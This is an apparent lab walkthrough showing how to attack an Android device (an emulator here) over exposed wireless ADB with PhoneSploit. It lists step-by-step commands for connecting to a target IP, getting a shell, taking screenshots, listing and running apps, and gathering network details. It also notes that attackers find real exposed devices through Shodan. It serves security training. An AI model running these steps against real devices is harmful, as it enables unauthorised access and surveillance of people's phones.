- Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.
- Usually, developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device.
- In this task, we will exploit the Android platform through ADB using the PhoneSploit tool.
- Open Terminal
	> sudo su
	> cd
	> cd PhoneSploit 
	> python3 -m pip install colorama (to install the dependency)
	> python3 phonesploit.py (to run the tool)
	
	> 3 (connect to a new phone option)
	> Enter #targetip 
	
	> 4 (to choose access shell on a phone)
	> pwd (to show current working directory of target machine)
	
	> 7 (to choose **Screen Shot a picture on a phone**)
	> /home/Desktop (location to save the screenshot)
	
	> 14 (to choose **List all apps on a phone**)
	- The result appears, displaying the installed apps on the target Android device.
	- Using this information, you can use other PhoneSploit options to either launch or uninstall any of the installed apps.

	> 15 (to choose **Run an app**)
	- Based on the information obtained in the previous step about the installed applications, you can launch any app of your choice.

	> p (to navigate to additional PhoneSploit options on the **Next Page**)
	
	> 18 ( to choose **Show Mac/Inet** information for the target Android device)
	- The result appears, displaying the Mac/Inet information of the target Android device.

	> 21 (to choose the **NetStat** option)
	- The result appears, displaying netstat information of the target Android device.
	- For demonstration purposes, in this task, we are exploiting the Android emulator machine. However, in real life, attackers use the **Shodan** search engine to find ADB-enabled devices and exploit them to gain sensitive information and carry out malicious activities.

- In the same way, you can exploit the target **Android** device further by choosing other PhoneSploit options such as **Install an apk on a phone**, **Screen record a phone**, **Turn The Device off**, and **Uninstall an app**.
